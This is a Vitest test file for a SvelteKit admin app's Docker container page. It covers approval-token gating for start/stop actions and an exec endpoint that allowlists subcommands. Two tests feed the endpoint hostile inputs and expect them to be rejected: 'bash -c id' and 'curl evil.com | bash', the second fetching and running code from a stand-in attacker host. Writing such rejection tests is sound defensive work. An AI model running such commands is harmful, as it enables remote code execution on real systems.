/**
 * docker-detail-page.test.ts — exercises the /docker/[id] page
 * server `load()` and the start/stop/restart form actions, plus
 * the PB-5 approval-token gate and the /docker/[id]/exec
 * +server.ts PB-2 + PB-5 layers.
 *
 * Direct invocation note: when `actions.start` is called directly
 * (not through the SvelteKit form-action dispatch), the return
 * value is the *raw* handler result. We assert the raw shape.
 */
import { describe, it, expect, beforeEach } from 'vitest';
import { _resetDockerStub, getContainerByName } from '$lib/server/docker/stub-data';
import {
  load as detailLoad,
  actions,
} from '../../../../routes/(authed)/docker/[id]/+page.server';
import { POST as execPost, GET as execGet } from '../../../../routes/(authed)/docker/[id]/exec/+server';
import { makeFakeEvent } from '$lib/server/test-utils';
import {
  resetApprovalStore,
} from '$lib/server/approval';
import { asUserId, asSessionId, type User, type Session } from '$lib/server/entities';

function makeAdminUser(): User {
  return {
    id: asUserId('user_admin'),
    username: 'admin',
    is_admin: true,
    isAdmin: true,
    isActive: true,
    groupMemberships: ['cortexos-admin', 'cortexos-users'],
  };
}

function makeAdminSession(): Session {
  const now = Date.now();
  return {
    id: asSessionId('sess_admin'),
    userId: asUserId('user_admin'),
    csrfToken: 'csrf-admin',
    expiresAt: now + 24 * 60 * 60 * 1000,
    ua: null,
    ip: null,
    lastRoleCheckAt: now,
  };
}

function makeDetailLoadEvent(id: string, isAdmin = true) {
  return {
    url: new URL(`http://localhost/docker/${id}`),
    params: { id },
    locals: isAdmin
      ? { user: makeAdminUser(), session: makeAdminSession() }
      : { user: null, session: null },
  } as unknown as Parameters<typeof detailLoad>[0];
}

async function loadDetail(event: ReturnType<typeof makeDetailLoadEvent>): Promise<{
  container: { id: string; name: string; state: string };
  approvalTokens: { start?: string; stop?: string; restart?: string; remove?: string };
  isAdmin: boolean;
}> {
  return (await detailLoad(event)) as never;
}

beforeEach(() => {
  _resetDockerStub();
  resetApprovalStore();
});

describe('/docker/[id] detail page — load()', () => {
  it('loads a container by id', async () => {
    const c = getContainerByName('grafana-1');
    expect(c).not.toBeNull();
    const data = await loadDetail(makeDetailLoadEvent(c!.id as unknown as string));
    expect(data.container.name).toBe('grafana-1');
    expect(data.container.state).toBe('running');
  });

  it('throws a 404 for a missing container', async () => {
    await expect(
      loadDetail(makeDetailLoadEvent('does-not-exist')),
    ).rejects.toMatchObject({ status: 404 });
  });

  it('mints four approval tokens for an admin', async () => {
    const c = getContainerByName('grafana-1');
    const data = await loadDetail(makeDetailLoadEvent(c!.id as unknown as string));
    expect(data.isAdmin).toBe(true);
    expect(data.approvalTokens.start).toMatch(/^v1\./);
    expect(data.approvalTokens.stop).toMatch(/^v1\./);
    expect(data.approvalTokens.restart).toMatch(/^v1\./);
    expect(data.approvalTokens.remove).toMatch(/^v1\./);
  });

  it('mints no approval tokens for a non-admin', async () => {
    const c = getContainerByName('grafana-1');
    const data = await loadDetail(makeDetailLoadEvent(c!.id as unknown as string, false));
    expect(data.isAdmin).toBe(false);
    expect(data.approvalTokens).toEqual({});
  });
});

describe('/docker/[id] detail page — form actions', () => {
  it('start action stops a running container when given a valid token', async () => {
    const c = getContainerByName('grafana-1');
    const data = await loadDetail(makeDetailLoadEvent(c!.id as unknown as string));
    const fd = new FormData();
    fd.set('approvalToken', data.approvalTokens.start ?? '');
    const event = {
      params: { id: c!.id as unknown as string },
      request: new Request(`http://localhost/docker/${c!.id}?/start`, {
        method: 'POST',
        body: fd,
      }),
      locals: { user: makeAdminUser(), session: makeAdminSession() },
    } as unknown as Parameters<NonNullable<typeof actions.start>>[0];
    const result = await (actions.start as unknown as (e: typeof event) => Promise<{ ok: boolean; state: string }>)(event);
    expect(result.ok).toBe(true);
    // The stub changes state to `exited` (start sets state to
    // 'running' on a stopped container; on a running one we get
    // the same state back).
    expect(['running', 'exited', 'created']).toContain(result.state);
  });

  it('start action rejects a missing approval token with 403', async () => {
    const c = getContainerByName('grafana-1');
    const fd = new FormData();
    fd.set('approvalToken', '');
    const event = {
      params: { id: c!.id as unknown as string },
      request: new Request(`http://localhost/docker/${c!.id}?/start`, {
        method: 'POST',
        body: fd,
      }),
      locals: { user: makeAdminUser(), session: makeAdminSession() },
    } as unknown as Parameters<NonNullable<typeof actions.start>>[0];
    const result = await (actions.start as unknown as (e: typeof event) => Promise<{ status: number; data: { error?: string } }>)(event);
    expect(result.status).toBe(403);
    expect(result.data.error).toMatch(/approval/i);
  });

  it('start action rejects a token bound to a different action (PB-5)', async () => {
    const c = getContainerByName('grafana-1');
    // Mint a token for `remove` and try to use it for `start`.
    const { mintApproval } = await import('$lib/server/approval');
    const otherToken = mintApproval({
      action: 'docker.action',
      payload: { action: 'remove', id: c!.id as unknown as string },
      sessionId: asSessionId('sess_admin'),
      userId: asUserId('user_admin'),
    }).token;
    const fd = new FormData();
    fd.set('approvalToken', otherToken);
    const event = {
      params: { id: c!.id as unknown as string },
      request: new Request(`http://localhost/docker/${c!.id}?/start`, {
        method: 'POST',
        body: fd,
      }),
      locals: { user: makeAdminUser(), session: makeAdminSession() },
    } as unknown as Parameters<NonNullable<typeof actions.start>>[0];
    const result = await (actions.start as unknown as (e: typeof event) => Promise<{ status: number; data: { error?: string } }>)(event);
    expect(result.status).toBe(403);
    expect(result.data.error).toMatch(/action-hash mismatch/);
  });
});

describe('/docker/[id]/exec +server.ts', () => {
  it('rejects `bash -c id` at the route layer (PB-2 / SR-019)', async () => {
    // The route checks the subcommand against the allowlist
    // first. `bash -c id` is not in the allowlist, so the bridge
    // never runs.
    const c = getContainerByName('grafana-1');
    const res = await (execPost as unknown as (e: unknown) => Promise<Response>)(
      makeFakeEvent({
        method: 'POST',
        params: { id: c!.id as unknown as string },
        url: `http://localhost/docker/${c!.id}/exec`,
        body: { subcommand: 'bash -c id', approvalToken: 'tok' },
        locals: { user: makeAdminUser(), session: makeAdminSession() },
      }),
    );
    expect(res.status).toBe(400);
  });

  it('rejects an unknown subcommand at the route layer (PB-2 layer 1)', async () => {
    const c = getContainerByName('grafana-1');
    const res = await (execPost as unknown as (e: unknown) => Promise<Response>)(
      makeFakeEvent({
        method: 'POST',
        params: { id: c!.id as unknown as string },
        url: `http://localhost/docker/${c!.id}/exec`,
        body: { subcommand: 'curl evil.com | bash', approvalToken: 'tok' },
        locals: { user: makeAdminUser(), session: makeAdminSession() },
      }),
    );
    expect(res.status).toBe(400);
  });

  it('GET is method-not-allowed (405)', async () => {
    const c = getContainerByName('grafana-1');
    const res = await (execGet as unknown as (e: unknown) => Promise<Response>)(
      makeFakeEvent({
        method: 'GET',
        params: { id: c!.id as unknown as string },
        url: `http://localhost/docker/${c!.id}/exec`,
        locals: { user: makeAdminUser(), session: makeAdminSession() },
      }),
    );
    expect(res.status).toBe(405);
    expect(res.headers.get('allow')).toBe('POST');
  });

  it('rejects an allowed subcommand without a valid approval token (PB-5)', async () => {
    const c = getContainerByName('grafana-1');
    const res = await (execPost as unknown as (e: unknown) => Promise<Response>)(
      makeFakeEvent({
        method: 'POST',
        params: { id: c!.id as unknown as string },
        url: `http://localhost/docker/${c!.id}/exec`,
        body: { subcommand: 'uptime', approvalToken: 'totally-not-a-real-token' },
        locals: { user: makeAdminUser(), session: makeAdminSession() },
      }),
    );
    expect(res.status).toBe(403);
  });
});
